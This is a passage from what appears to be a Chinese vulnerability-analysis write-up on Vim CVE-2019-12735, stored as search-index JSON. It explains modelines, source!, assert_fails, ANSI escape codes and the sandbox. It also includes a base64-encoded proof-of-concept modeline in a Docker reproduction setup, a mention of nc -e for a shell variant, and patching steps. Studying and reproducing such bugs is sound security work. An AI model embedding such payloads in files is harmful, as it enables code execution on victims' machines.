func1()\n\nmain()\n\n\n# \u6253\u5f00a.py\u540e, \u9ed8\u8ba4\u7684tab\u957f\u5ea6\u662f8\u4e2a\u7a7a\u683c\uff0c\u4e0d\u652f\u6301\u56de\u8f66\u81ea\u52a8\u7f29\u8fdb\n# \u53ef\u4ee5\u901a\u8fc7tabstop\u548cautoindent\u4e24\u4e2a\u9009\u9879\u6765\u914d\u7f6e\n:set tabstop=4\n:set autoindent\n\n\n# \u6548\u679c\u5982\u4e0b\uff1a\n# python3\n# coding=utf-8\nimport platform\n\ndef func1():\n    for i in range(10):\n        print(\"hello vim\")\n        print(platform.platform())\n        # cursor is here\n\ndef main():\n    func1()\n\nmain()\n\n\n# \u4f46\u662f\u4e0b\u6b21\u6253\u5f00\u540e\uff0c\u53c8\u9700\u8981\u518d\u914d\u7f6e\u4e00\u6b21\n# \u53ef\u4ee5\u901a\u8fc7modeline\u6765\u4f7f\u8fd9\u4e2a\u914d\u7f6e\u6bcf\u6b21\u6253\u5f00a.py\u6587\u4ef6\u65f6\u90fd\u751f\u6548\n# \u5728\u6587\u4ef6\u5f00\u5934\u6dfb\u52a0\u4e00\u884c\u5185\u5bb9\uff1a # vim: set tabstop=4 autoindent: \n# \u518d\u6b21\u6253\u5f00\u6548\u679c\u5982\u4e0b\uff1a\n\n$ vim a.py\n# vim: set tabstop=4 autoindent: \n# python3\n# coding=utf-8\nimport platform\n\n\ndef func1():\n    for i in range(10):\n        print(\"hello vim\")\n        print(platform.platform())\n        # cursor is here\n\ndef main():\n    func1()\n\nmain()  For security reasons, only a subset of options is permitted in modelines, and if the option value contains an expression, it is executed in a sandbox \n\u4e3a\u4e86\u5b89\u5168\u539f\u56e0\uff0c\u53ea\u6709\u90e8\u5206options\u53ef\u4ee5\u5728modeline\u4e2d\u914d\u7f6e\uff0c\u5982\u679coption\u7684\u503c\u662f\u4e00\u4e2a\u8868\u8fbe\u5f0f(\u6bd4\u5982\u914d\u7f6efoldexpr)\uff0c\u90a3\u4e48\u8868\u8fbe\u5f0f\u4f1a\u5728vim\u7684sandbox\u4e2d\u6267\u884c",
            "title": "Vim\u7684modeline\u529f\u80fd"
        },
        {
            "location": "/userspace/cve-2019-12735-\u9644\u4ef6/#vim_1",
            "text": "\u6839\u636eVim Script\u8bed\u6cd5\u7f16\u5199Vim\u811a\u672c\uff0c\u53c2\u8003\uff1a  https://github.com/name5566/vim-config/blob/master/vim_script.md  http://vimdoc.sourceforge.net/htmldoc/usr_41.html  http://vimdoc.sourceforge.net/htmldoc/eval.html  http://vimdoc.sourceforge.net/htmldoc/eval.html#functions  # \u521b\u5efa\u4e00\u4e2aVim\u811a\u672c1.vim\n$ vim 1.vim\n\n\n# \u6309\u7167Vim Script\u8bed\u6cd5\u7f16\u8f91\u811a\u672c\n:let i = 1\n:while i < 10\n:    let a = getline(i)\n:    if empty(a) \n:        break\n:    endif\n:    echo \"Line:\" i \"is\"  a\n:    let i += 1\n:endwhile\n\n\n# \u4fdd\u5b58\n:w\n\n\n# \u7528source\u6307\u4ee4\u52a0\u8f7d\u81ea\u5df1\u5e76\u6267\u884c\n:source % \n# or\n:source 1.vim\n\n\n# \u6267\u884c\u7ed3\u679c\uff1a\nLine: 1 is :let i = 1\nLine: 2 is :while i < 10\nLine: 3 is :    let a = getline(i)\nLine: 4 is :    if empty(a)\nLine: 5 is :        break\nLine: 6 is :    endif\nLine: 7 is :    echo \"Line:\" i \"is\"  a\nLine: 8 is :    let i += 1\nLine: 9 is :endwhile\nPress ENTER or type command to continue\n\n\n\n# \u5728\u7f16\u8f91\u5176\u4ed6\u6587\u4ef6\u7684\u65f6\u5019\u52a0\u8f7d\u5e76\u6267\u884c\u4e00\u4e2aVim\u811a\u672c\n$ vim a.txt\nHello\nVim\nGoodbye!\n~         \n:source 1.vim\n\n\nLine: 1 is Hello\nLine: 2 is Vim\nLine: 3 is Goodbye!\nPress ENTER or type command to continue",
            "title": "Vim\u8868\u8fbe\u5f0f\u548c\u811a\u672c"
        },
        {
            "location": "/userspace/cve-2019-12735-\u9644\u4ef6/#source",
            "text": "source\u547d\u4ee4\u7528\u4e8e\u4eceVim\u811a\u672c\u6587\u4ef6\u4e2d\u8bfb\u53d6Vim\u6307\u4ee4\u5e76\u6267\u884c\uff0c\u53c2\u8003\uff1a http://vimdoc.sourceforge.net/htmldoc/repeat.html#using-scripts  :help source\n\n:so[urce] {file}        \n  Read Ex commands from {file}.  \n  These are commands that start with a \":\".\n\n\n:so[urce]! {file}       \n  Read Vim commands from {file}.  \n  These are commands that are executed from Normal mode, \n  like you type them.  source\u548csource!\u7684\u533a\u522b\u5728\u4e8e\uff1a   source\u662f\u4ece\u6587\u4ef6\u8bfb\u53d6 Ex commands, \u4e5f\u5c31\u662f\u8bf4\u6587\u4ef6\u7684\u5185\u5bb9\u5fc5\u987b\u662f :cmd \u7684\u5f62\u5f0f  source!\u662f\u4ece\u6587\u4ef6\u8bfb\u53d6 Normal mode\u4e0b\u6267\u884c\u7684vim commands, \u4e5f\u5c31\u662f\u8bf4\u6587\u4ef6\u4e2d\u7684 <ESC> i /  \u5b57\u7b26\u8fd9\u4e9b\u90fd\u4f1a\u5f53\u6210Normal mode\u4e0b\u7684\u7528\u6237\u8f93\u5165(like you type them)   # \u521b\u5efa\u4e00\u4e2avim\u811a\u672c\uff0c\u5199\u5165\u5185\u5bb9iHello,World\u540e\u4fdd\u5b58\n$ vim 5.vim\niHello,World\n\n:wq\n\n# \u7528source! \u52a0\u8f7d\u5e76\u6267\u884c\u811a\u672c\n$ vim \n:source! 5.vim\n\n# \u6548\u679c\u5982\u4e0b\uff0c\u6253\u5f00\u540e\u76f4\u63a5\u8fdb\u5165\u4e86Insert mode\nHello,World\n\n~                                                                      \n~                                                                      \n...                                                                    \n~                                                                       \n~                                                                                                        \n-- INSERT --\n\n\n# \u800c\u7528source\u52a0\u8f7d\u5219\u4f1a\u62a5\u9519\n$ vim \n:source 5.vim\n\n\nError detected while processing 5.vim:\nline    1:\nE492: Not an editor command: iHello,World\nPress ENTER or type command to continue",
            "title": "source\u547d\u4ee4"
        },
        {
            "location": "/userspace/cve-2019-12735-\u9644\u4ef6/#vimshell",
            "text": "\u901a\u8fc7\u5728command-line mode\u4e0b\uff0c\u4f7f\u7528 !{cmd}\u6765\u6267\u884cshell\u547d\u4ee4  $ vim\n:!uname -a\n\nLinux ubuntu 4.4.0-112-generic #135-Ubuntu SMP Fri Jan 19 11:48:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux\n\nPress ENTER or type command to continue  # \u4e00\u4e2a\u53ef\u4ee5\u6267\u884cshell\u547d\u4ee4\u7684vim\u811a\u672c\n$ vim a.vim\n<i>\n:!uname -a\n~\n~\n<ESC>\n:source %\n\n... Darwin Kernel Version 18.2.0: Thu Dec 20 20:46:53 PST 2018; root:xnu-4903.241.1~1/RELEASE_X86_64 x86_64\n\nPress ENTER or type command to continue\n\n# \u7279\u6b8a\u7684\u51fd\u6570execute\n# $ vim\n# :help execute()\n#  execute({command} [, {silent}])                                 *execute()*\n#                 Execute an Ex command or commands and return the output as a\n#                 string. \n#                 {command} can be a string or a List.  In case of a List the\n#                 lines are executed one by one. \n# ...\n\n#                 The optional {silent} argument can have these values:\n#                         \"\"              no `:silent` used\n#                         \"silent\"        `:silent` used\n#                         \"silent!\"       `:silent!` used\n#                               The default is \"silent\".  \n#                               Note that with \"silent!\", unlike `:redir`, error messages are dropped\n# ...\n\n\n$ vim b.vim\n: call execute(\"source a.vim\", \"\")\n\n\n... Darwin Kernel Version 18.2.0: Thu Dec 20 20:46:53 PST 2018; root:xnu-4903.241.1~1/RELEASE_X86_64 x86_64\n\n\nPress ENTER or type command to continue\n\n\n# execute\u51fd\u6570\u5728ubuntu\u4e0a\u5b89\u88c5\u7684Vim\u4e2d\u6ca1\u6709\uff0c\u4f46\u662f\u8fd8\u6709\u53e6\u4e00\u4e2a\u53ef\u4ee5\u6267\u884cshell\u547d\u4ee4\uff1aassert_fails()\n# $ vim\n# :help assert_fails\n# \n# assert_fails({cmd} [, {error}])                                 *assert_fails()*\n#                 Run {cmd} and add an error message to |v:errors| if it does\n#                 NOT produce an error.\n#                 When {error} is given it must match in |v:errmsg|.\n$ vim b.vim\n: call assert_fails(\"source a.vim\")\n\n\n... Darwin Kernel Version 18.2.0: Thu Dec 20 20:46:53 PST 2018; root:xnu-4903.241.1~1/RELEASE_X86_64 x86_64\n\n\nPress ENTER or type command to continue",
            "title": "vim\u6267\u884cshell\u547d\u4ee4"
        },
        {
            "location": "/userspace/cve-2019-12735-\u9644\u4ef6/#silent",
            "text": "# :help silent\n#                              *:sil* *:silent* *:silent!*\n# :sil[ent][!] {command}  \n#    Execute {command} silently.  \n#    Normal messages will not\n#    be given or added to the message history.\n#    When [!] is added, error messages will also be\n#    skipped, and commands and mappings will not be aborted\n#    when an error is detected.\n\n\n\n# 1. \u7f16\u5199\u4e00\u4e2a\u6587\u4ef6\uff0c\u4e0d\u4f7f\u7528silent\uff0c\u4fdd\u5b58\u540e\u4f1a\u5728\u5e95\u90e8\u51fa\u73b0\u56de\u663e\u4fe1\u606f\nvim 1.txt\ni\nsomething \n~                                                                      ...     \n~       \n<ESC>\n:w                                                                   \n\"a.vim\" 1L, 11C written\n\n# 2. \u4f7f\u7528silent\uff0cw\u547d\u4ee4\u7684\u56de\u663e\u4fe1\u606f\u5c31\u6d88\u5931\u4e86\nvim 1.txt\ni\nsomenthing\n~                                                                       ...   \n~                                                                               \n:silent! w\n\n# 3. silent! \u53ef\u4ee5\u7528\u6765\u53bb\u9664\u9519\u8bef\u4fe1\u606f\nvim 1.txt\ni\nsomething\n<ESC>\n:w\n:file | silent! Anycommand or anytext'\\' \\; \"\n\nsomething\n~                                                                      ...\n~                                                                                                                                           \n\"1.vim\" line 1 of 1 --100%-- col 9",
            "title": "silent\u547d\u4ee4"
        },
        {
            "location": "/userspace/cve-2019-12735-\u9644\u4ef6/#redraw",
            "text": "# :help redraw!\n#                                             *:redr*  *:redraw*\n# :redr[aw][!]            \n#  Redraw the screen right now.  \n#  When ! is included it is cleared first.\n#                         ... \n# \u7acb\u523b\u5237\u65b0\u5c4f\u5e55\uff0c\u5982\u679c\u8bbe\u7f6e\u4e86!\u5219\u5148\u6e05\u9664\u5c4f\u5e55\u5185\u5bb9\n# \u6bcf\u6761\u547d\u4e86\u6267\u884c\u5b8c\uff0c\u5e95\u90e8\u4f1a\u7559\u4e0b\u5386\u53f2\u8bb0\u5f55\uff0c redraw!\u4f1a\u6e05\u9664\u6389\u8bb0\u5f55\n\n# \u5c4f\u5e55\u4f1a\u6e05\u7a7a\nvim 1.txt\ni\nsomenthing\n~                                                                       ...   \n~                                                                               \n:silent! w\n:redraw!\n\nsomething\n~                                                                       ...\n~",
            "title": "redraw\u547d\u4ee4"
        },
        {
            "location": "/userspace/cve-2019-12735-\u9644\u4ef6/#file",
            "text": "# \u8f93\u5165\u5f53\u524d\u6587\u4ef6\u4fe1\u606f\nvim 1.txt\ni\nsomething\n<ESC>\n:w\n:file\nsomething\n~                                                                      ...\n~                                                                                                                                           \n\"1.vim\" line 1 of 1 --100%-- col 9",
            "title": "file\u547d\u4ee4"
        },
        {
            "location": "/userspace/cve-2019-12735-\u9644\u4ef6/#system",
            "text": "system({expr} [, {input}])                              *system()* *E677*\nGet the output of the shell command {expr} as a string.  \n... \n\n$ vim\n:let a = system('pwd')\n:echo a\n\n~                                                                      \n/home/invincible/Desktop/test/vim_test\n\nPress ENTER or type command to continue",
            "title": "system\u51fd\u6570"
        },
        {
            "location": "/userspace/cve-2019-12735-\u9644\u4ef6/#assert_fails",
            "text": "\u6267\u884c\u4e00\u4e2avim command, \u5982\u679c\u6ca1\u6709\u51fa\u9519\uff0c\u5219\u5c06command\u7684\u6267\u884c\u4fe1\u606f\u4fdd\u5b58\u5230v:errors\u5168\u5c40\u53d8\u91cf\u4e2d  :help assert_fails\n\nassert_fails({cmd} [, {error}])                                \n  Run {cmd} and add an error message to |v:errors| \n  if it does NOT produce an error.\n  When {error} is given it must match in |v:errmsg|.  $ vim\n:call assert_fails(\"echo 'hello'\")\n\n~\n...\n~\nhello\n\n:echo v:errors\n['command did not fail: echo ''hello''']  \u7f16\u5199\u4e00\u4e2a\u53ef\u4ee5\u6267\u884cshell\u547d\u4ee4\u7684vim\u811a\u672c  \n$ vim a.vim\n<i>\n:!uname -a\n~\n~\n<ESC>\n:wq\n\n# \u7528assert_faild\u6267\u884cvim\u7684source\u6307\u4ee4\uff0c\u52a0\u8f7dvim\u811a\u672ca.vim\n$ vim\n:call assert_fails(\"source a.vim\")\n\nLinux ubuntu 4.4.0-112-generic #135-Ubuntu SMP Fri Jan 19 11:48:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux\n\nPress ENTER or type command to continue\n\n:echo v:errormsg\n['command did not fail: source a.vim']",
            "title": "assert_fails\u51fd\u6570"
        },
        {
            "location": "/userspace/cve-2019-12735-\u9644\u4ef6/#vimfolding",
            "text": "vim\u7684folding\u529f\u80fd\u7528\u4e8e\u5bf9\u6587\u672c\u4e2d\u7684\u6587\u672c\u5757\uff08\u6bd4\u5982\u4e00\u4e2a\u51fd\u6570\uff0c\u4e00\u6bb5\u6ce8\u91ca\uff09\u6298\u53e0\u548c\u5c55\u5f00\uff0c\u53ef\u4ee5\u7c7b\u6bd4\u4e3a\u56fe\u5f62\u5316\u7f16\u8f91\u5668\u7f16\u8f91\u533a\u4fa7\u680f\u7684(+/-)\u3002    foldmethod\u9009\u9879\u662f\u7528\u6765\u914d\u7f6eVim\u7684\u4ee3\u7801\u6298\u53e0\u529f\u80fd\u7684\uff0cVim\u7ed9\u51fa\u4e86manual, indent, expr, syntax, diff, marker\u8fd9\u51e0\u79cd\u4ee3\u7801\u6298\u53e0\u7684\u65b9\u5f0f\uff0c\u4e0b\u9762\ud83d\udc47\u662findent\u65b9\u5f0f\u7684\u6548\u679c\uff1a    # \u6587\u672c\u5982\u4e0b\n$ vim a.py\n\n# python3\n# coding=utf-8\nimport platform\n\ndef func1():\n        for i in range(10):\n                print(\"hello vim\")\n                print(platform.platform())\n\ndef main():\n        func1()\n\nmain()\n\n\n# 1. \u8bbe\u7f6efoldmethod\u9009\u9879\n:set foldenable\n:set foldmethod=indent\n\n# \u6548\u679c\u5982\u4e0b\n# python3\n# coding=utf-8\nimport platform\n\ndef func1():\n+--  3 lines: for i in range(10):-------------------------------------\n\ndef main():\n        func1()\n\nmain()  \u5982\u679c\u4e0d\u6ee1\u8db3\u4e8e\u7ed9\u5b9a\u7684\u51e0\u79cd\u65b9\u5f0f\uff0c\u53ef\u4ee5\u5c06foldmethod\u8bbe\u7f6e\u4e3aexpr\u6765\u81ea\u5b9a\u4e49\u4ee3\u7801\u5757\u7684\u7279\u5f81  # \u6587\u672c\u5982\u4e0b\n$ vim a.py\n\n# python3\n# coding=utf-8\nimport platform\n\ndef func1():\n        for i in range(10):\n                print(\"hello vim\")\n                print(platform.platform())\n\ndef main():\n        func1()\n\n\nmain()\n\n:set foldenable\n:set foldmethod=expr\n:set foldexpr=getline(v:lnum)[0]==\\\"#\\\"\n# foldexpr\u7528\u4e8e\u8bbe\u7f6e\u6587\u672c\u6ee1\u8db3\u7684\u6761\u4ef6\uff0c\u6ee1\u8db3\u6761\u4ef6\u7684\u6587\u672c\u5757\u4f1a\u88ab\u6298\u53e0\n# \u8be5\u914d\u7f6e\u7684\u610f\u601d\u662f\u901a\u8fc7Vim\u7684getline\u51fd\u6570\uff0c\u5224\u65ad\u6bcf\u4e00\u884c\u6587\u672c\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u662f\u5426\u4e3a\"#\"\uff0c\u5c06\u6ee1\u8db3\u6761\u4ef6\u7684\u76f8\u90bb\u7684\u884c\u89c6\u4e3a\u4e00\u4e2a\u6587\u672c\u5757\uff0c\u5e76\u5c06\u5176\u6298\u53e0\n# \u6548\u679c\u5982\u4e0b: \n\n+--  2 lines: # python3-----------------------------------------------\nimport platform\n\ndef func1():\n        for i in range(10):\n                print(\"hello vim\")\n                print(platform.platform())\n\ndef main():\n        func1()\n\nmain()",
            "title": "Vim\u7684folding\u529f\u80fd"
        },
        {
            "location": "/userspace/cve-2019-12735-\u9644\u4ef6/#vimsandbox",
            "text": "11. The sandbox                 *eval-sandbox* *sandbox* *E48*\n\n\nThe 'foldexpr', 'formatexpr', 'includeexpr', 'indentexpr', 'statusline' and\n'foldtext' options may be evaluated in a sandbox. \n\n\nThis gives some safety for when these options are set from a modeline.  \n\n\nThese items are not allowed in the sandbox:\n    - changing the buffer text\n    - defining or changing mapping, autocommands, functions, user commands\n    - setting certain options (see |option-summary|)\n    - setting certain v: variables (see |v:var|)  *E794*\n    - executing a shell command\n    - reading or writing a file\n    - jumping to another buffer or editing a file\n    - executing Python, Perl, etc. commands",
            "title": "vim\u7684sandbox\u6982\u5ff5"
        },
        {
            "location": "/userspace/cve-2019-12735-\u9644\u4ef6/#ansi-escape-codes",
            "text": "\u53c2\u8003\uff1a  https://www.gnu.org/software/screen/manual/html_node/Control-Sequences.html  https://notes.burke.libbey.me/ansi-escape-codes/  https://learnku.com/articles/26231",
            "title": "ANSI escape codes"
        },
        {
            "location": "/userspace/cve-2019-12735-\u9644\u4ef6/#x1b1g",
            "text": "\\x1b[1G \u5149\u6807\u79fb\u52a8\u5230\u5f53\u524d\u884c\u7684\u7b2cPn\u4e2a\u4f4d\u7f6e  # ESC [ Pn G                      Cursor horizontal position\n# $ echo -e \"Hello\\x1b[1GA\" > a.txt\n# $ cat a.txt\n# Aello\n# $ echo -e \"Hello\\x1b[2GA\" > a.txt\n# $ cat a.txt\n# HAllo\n# $ echo -e \"Hello\\x1b[3GA\" > a.txt\n# $ cat a.txt\n# HeAlo",
            "title": "\\x1b[1G"
        },
        {
            "location": "/userspace/cve-2019-12735-\u9644\u4ef6/#x1bd",
            "text": "\\x1b[D \u5149\u6807\u5de6\u79fb1\u4e2a\u4f4d\u7f6e  # ESC [ Pn D                      Cursor Left\n# \u5149\u6807\u5de6\u79fbPn\u4e2a\u4f4d\u7f6e\n# $ echo -e \"Hello\\x1b[D\" > a.txt\n# $ cat a.txt\n# Hello\n# $ echo -e \"Hello\\x1b[D\\x1b[D\\x1b[DAAA\" > a.txt\n# $ cat a.txt\n# HeAAA\n# $ echo -e \"Hello\\x1b[5DAAA\" > a.txt\n# $ cat a.txt\n# AAAlo",
            "title": "\\x1b[D"
        },
        {
            "location": "/userspace/cve-2019-12735-\u9644\u4ef6/#x1bk",
            "text": "\\x1b[K \u6e05\u9664\u5149\u6807\u5230\u5f53\u524d\u4f4d\u7f6e\u7684\u5185\u5bb9  # *  ESC [ K           erase to end of line (inclusive)\n# \u6e05\u9664\u5149\u6807\u5230\u5f53\u524d\u4f4d\u7f6e\u7684\u5185\u5bb9(\u4e0d\u4f1a\u6539\u53d8\u6587\u672c)\uff0c\u53ef\u4ee5\u914d\u5408\\x1b[G\u4f7f\u7528\n$ echo -e \"AAAA\\x1b[1G\\x1b[KBBBB\" > a.txt\n$ cat  a.txt\nBBBB\n$ echo -e \"ABCD\\x1b[2G\\x1b[KEEEE\" > a.txt\n$ cat  a.txt\nAEEEE\n$ echo -e \"ABCD\\x1b[3G\\x1b[KEEEE\" > a.txt\n$ cat a.txt \nABEEEE\n$ echo -e \"ABCD\\x1b[KEEEE\" > a.txt\n$ cat a.txt \nABCDEEEE",
            "title": "\\x1b[K"
        },
        {
            "location": "/userspace/cve-2019-12735-\u9644\u4ef6/#x1b2k",
            "text": "",
            "title": "\\x1b[2K"
        },
        {
            "location": "/userspace/cve-2019-12735-\u9644\u4ef6/#x1b7l",
            "text": "ESC [ ? 7 l       auto wrap off     \\x1b[?7l \u5173\u95ed\u81ea\u52a8\u6362\u884c (l -> low)    \\x1b[?7h \u5f00\u542f\u81ea\u52a8\u6362\u884c (h -> high)   \u8fd9\u4e2a\u547d\u4ee4\u7684\u529f\u80fd\u662f\u63a7\u5236Terminal\u7684\u663e\u793a\u529f\u80fd\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5982\u679c\u6587\u672c\u957f\u5ea6\u8d85\u8fc7Terminal\u7684\u663e\u793a\u957f\u5ea6\uff0c\u5219\u4f1a\u81ea\u52a8\u6362\u884c\uff0c\u5982\u679c\u5173\u95ed\u4e86\u81ea\u52a8\u6362\u884c\uff0c\u5219\u4f1a\u5168\u90e8\u663e\u793a\u5728\u4e00\u884c\uff0c\u8d85\u51fa\u7684\u90e8\u5206\u88ab\"\u622a\u65ad\"   \u200b         \\x1b[?7l \u548c \\x1b[1G \u914d\u5408\u4f7f\u7528\u7684\u6548\u679c\uff1a  \u4f7f\u7528\u524d \uff1a                      \u4f7f\u7528\u540e\uff1a          \\x1b[?7l \u548c \\x1b[1G + \\x1b[K \u914d\u5408\u4f7f\u7528\u7684\u6548\u679c\uff1a",
            "title": "\\x1b[?7l"
        },
        {
            "location": "/userspace/cve-2019-12735-\u9644\u4ef6/#x16",
            "text": "\u53c2\u8003:  http://defindit.com/ascii.html  https://zh.wikipedia.org/wiki/%E6%8E%A7%E5%88%B6%E5%AD%97%E7%AC%A6     \u8fd9\u662f\u4e00\u4e2aascii\u7801\u7684\u63a7\u5236\u5b57\u7b26\uff0c\u4ee3\u8868 ctrl+v\uff0c\u5b83\u7684\u529f\u80fd\u53ef\u4ee5\u7406\u89e3\u4e3a\uff1a\u8ba9\u4e0b\u4e00\u4e2a\u8f93\u5165\u8bc6\u522b\u4e3a\u666e\u901a\u5b57\u7b26  $ cat a.py\na = input(\"> \")\nprint(ord(a[0]))\n\n$ python3 a.py\n# \u60f3\u76f4\u63a5\u8f93\u5165ctrl+c, \u4f46\u7a0b\u5e8f\u9000\u51fa\uff0c\u88ab\u8bc6\u522b\u6210\u4e86\u4e2d\u65ad\u4fe1\u53f7\n> ^CTraceback (most recent call last):\n  File \"a.py\", line 1, in <module>\n    a = input(\"> \")\nKeyboardInterrupt\n\n$ python3 a.py\n# \u4f9d\u6b21\u6309\u4e0bctrl+v\u548cctrl+c, \u5c31\u987a\u5229\u6253\u5370\u51fa\u4e86ctrl+c\u7684ascii\u7801\n> ^C\n3  \u4e3a\u4ec0\u4e48Exp\u4e2d\u9700\u8981\\x16\u63a7\u5236\u5b57\u7b26  echo -e \"iHello\\x1b[D\" > a.vim\n$ vim \n:source! a.vim\n\nHello\n~                                                                      ...   \n~                                                                               \nE388: Couldn't find definition\n\n\u8fd9\u4e2a\u62a5\u9519\u53ef\u4ee5\u624b\u52a8\u8f93\u5165\u4e0b\u9762\u7684\u6307\u4ee4\u4ea7\u751f\uff1a\n$ vim\ni\nHello\n<ESC>\n[\nshift+d\n\n# \u5982\u679c\u52a0\u4e0a\\x16\u5219\\x1b\u4e0d\u4f1a\u88ab\u89e3\u6790\u6210<ESC>\u6309\u952e\uff0c\u800c\u662f\u8f93\u5165\u5b57\u7b26\necho -e \"iHello\\x16\\x1b[D\" > a.vim\n\nHello^[[D\n~                                                                      ...\n~\n\n-- INSERT --",
            "title": "\\x16"
        },
        {
            "location": "/userspace/cve-2019-12735-\u9644\u4ef6/#exp",
            "text": "nc -> nc.traditional    Ubuntu\u4e0a\u7684nc\u4e0d\u5305\u542b-e\u9009\u9879\uff0c\u89e3\u51b3\u529e\u6cd5\u662f\u5b89\u88c5nc.traditional\u6765\u66ff\u4ee3nc\u547d\u4ee4   \\x1b[K -> \\x1b[2K \u548c \\x1b[D -> \\x1b[2D \u548c\u7a7a\u683c\u662f\u7528\u4e8e\u6e05\u9664\u4e0d\u53ef\u89c1\u5b57\u7b26\\x16\u548c\u5f15\u53f7   \u4fee\u6539\u524d:             \u4fee\u6539\u540e:",
            "title": "exp\u4fee\u6539\u8bf4\u660e"
        },
        {
            "location": "/userspace/cve-2019-12735-\u9644\u4ef6/#vim_2",
            "text": "",
            "title": "Vim\u5b89\u88c5"
        },
        {
            "location": "/userspace/cve-2019-12735-\u9644\u4ef6/#apt",
            "text": "apt-get install vim-runtime=2:7.4.1689-3ubuntu1\napt-get install vim-common=2:7.4.1689-3ubuntu1\napt-get install vim=2:7.4.1689-3ubuntu1",
            "title": "apt\u81ea\u52a8\u5b89\u88c5"
        },
        {
            "location": "/userspace/cve-2019-12735-\u9644\u4ef6/#deb",
            "text": "\u94fe\u63a5: https://pan.baidu.com/s/1rn0RqwWn0tpgk9PY0v00Jw  \u5bc6\u7801:m0qc  sudo dpkg -i vim_2%3a7.4.1689-3ubuntu1_amd64.deb",
            "title": "\u4f7f\u7528deb\u5305\u5b89\u88c5"
        },
        {
            "location": "/userspace/cve-2019-12735-\u9644\u4ef6/#_2",
            "text": "# \u4e0b\u8f7d\u6e90\u7801\uff0c\u7f16\u8bd1\u751f\u6210\u7b26\u53f7\n# \u53c2\u8003\uff1ahttps://www.unix.com/programming/156665-compile-debug-vim-source-code.html\n$ mkdir ~/MyVim\n$ cd ~/MyVim\n$ sudo apt-get install libncurses5-dev libncursesw5-dev\n$ apt-get source vim=2:7.4.1689-3ubuntu1\n$ cd src\n$ cp Makefile Makefile.orig\n$ vim Makefile\n$ diff Makefile Makefile.orig\n540c540\n< CFLAGS = -g\n---\n> #CFLAGS = -g\n908c908\n< prefix = ~/MyVim\n---\n> #prefix = $(HOME)\n1852c1852\n< #    $(STRIP) $(DEST_BIN)/$(VIMTARGET)\n---\n>     $(STRIP) $(DEST_BIN)/$(VIMTARGET)\n$ cd ..\n$ make && make install\n$ cd bin\n$ gdb ./vim",
            "title": "\u4e0b\u8f7d\u6e90\u7801\u624b\u52a8\u7f16\u8bd1"
        },
        {
            "location": "/userspace/cve-2019-12735-\u9644\u4ef6/#docker",
            "text": "\u53ef\u4ee5\u901a\u8fc7Docker\u5feb\u901f\u642d\u5efapoc\u590d\u73b0\u73af\u5883  $ ls\nDockerfile\n$ cat Dockerfile\nFrom ubuntu:16.04\nRUN set -e -x ;\\\n    apt update ;\\\n    apt-get install -y vim-runtime=2:7.4.1689-3ubuntu1 ;\\\n    apt-get install -y vim-common=2:7.4.1689-3ubuntu1 ;\\\n    apt-get install -y vim=2:7.4.1689-3ubuntu1 ;\\\n    echo \"OiF1bmFtZSAtYXx8IiB2aTpmZW46ZmRtPWV4cHI6ZmRlPWFzc2VydF9mYWlscygic291cmNlXCFcIFwlIik6ZmRsPTA6ZmR0PSIK\" | base64 --decode > /root/poc.txt \n\n$ sudo docker build -t vim-cve-2019-12735 .\n$ sudo docker run -it vim-cve-2019-12735 /bin/bash\necho -e \"set modeline\\nset modelines=5\" > ~/.vimrc \ncd root\nvim poc.txt",
            "title": "Docker\u590d\u73b0\u73af\u5883\u642d\u5efa"
        },
        {
            "location": "/userspace/cve-2019-12735-\u9644\u4ef6/#_3",
            "text": "",
            "title": "\u6f0f\u6d1e\u9632\u62a4"
        },
        {
            "location": "/userspace/cve-2019-12735-\u9644\u4ef6/#package",
            "text": "\u67e5\u770b\u53ef\u5b89\u88c5\u7684Vim\u7248\u672c   # \u67e5\u770b\u53ef\u5b89\u88c5\u7684Vim\u7248\u672c\n$ apt-cache policy vim\nvim:\n  Installed: (none)\n  Candidate: 2:7.4.1689-3ubuntu1.4\n  Version table:\n     2:7.4.1689-3ubuntu1.4 500\n        500 https://mirrors.tuna.tsinghua.edu.cn/ubuntu xenial-updates/main amd64 Packages\n        500 https://mirrors.tuna.tsinghua.edu.cn/ubuntu xenial-security/main amd64 Packages\n     2:7.4.1689-3ubuntu1 500\n        500 https://mirrors.tuna.tsinghua.edu.cn/ubuntu xenial/main amd64 Packages\n\n# \u4eceVim\u5305\u7684changelog\u4e2d\u83b7\u53d6\u4fee\u590d\u6f0f\u6d1e\u7684\u7248\u672c\u53f7 2:7.4.1689-3ubuntu1.3\n$ cat vim_changelog.txt |grep CVE-2019-12735 -C 10\n...\nvim (2:7.4.1689-3ubuntu1.3) xenial-security; urgency=medium\n\n  * SECURITY UPDATE: Arbitrary code execution\n    - debian/patches/CVE-2019-12735.patch: disallow\n      sourcing a file in the sandbox in src/getchar.c\n    - CVE-2019-12735\n  * SECURITY UPDATE: Buffer overflow\n    - debian/patches/CVE-2017-5953.patch: check for an\n      invalid length in order to avoid a overflow in\n      src/spell.c.\n    - CVE-2017-5953\n\n\n -- Leonidas S. Barbosa <leo.barbosa@canonical.com>  Fri, 07 Jun 2019 12:35:43 -0300   \u5b89\u88c5\u5b58\u5728\u6f0f\u6d1e\u7684\u7248\u672c   \n$ sudo apt install vim-common=2:7.4.1689-3ubuntu1\n$ sudo apt install vim-runtime=2:7.4.1689-3ubuntu1\n$ sudo apt install vim=2:7.4.1689-3ubuntu1\n\n# \u901a\u8fc7apt-cache \u67e5\u770b\u5df2\u5b89\u88c5\u7684\u7248\u672c < 2:7.4.1689-3ubuntu1.3\n$ apt-cache policy vim:\n  Installed: 2:7.4.1689-3ubuntu1\n  Candidate: 2:7.4.1689-3ubuntu1.4\n  ...\n\n# \u914d\u7f6evimrc\u5f00\u542fmodeline\u529f\u80fd\nvim ~/.vimrc\ni\nset modeline\nset modelines=5\n<ESC>\n:w\n\n# \u6d4b\u8bd5\u6548\u679c\n$ vim poc.txt\n\nLinux ubuntu 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux\n\n\nPress ENTER or type command to cont   \u5b89\u88c5\u6700\u65b0\u7248\u672c\u7684vim   # \u5b89\u88c5\u6700\u65b0\u7248\u672c\u7684vim\n$ sudo apt install vim\n\n# \u901a\u8fc7apt-cache \u67e5\u770b\u5df2\u5b89\u88c5\u7684\u7248\u672c > 2:7.4.1689-3ubuntu1.3\n$ apt-cache policy vim\nvim:\n  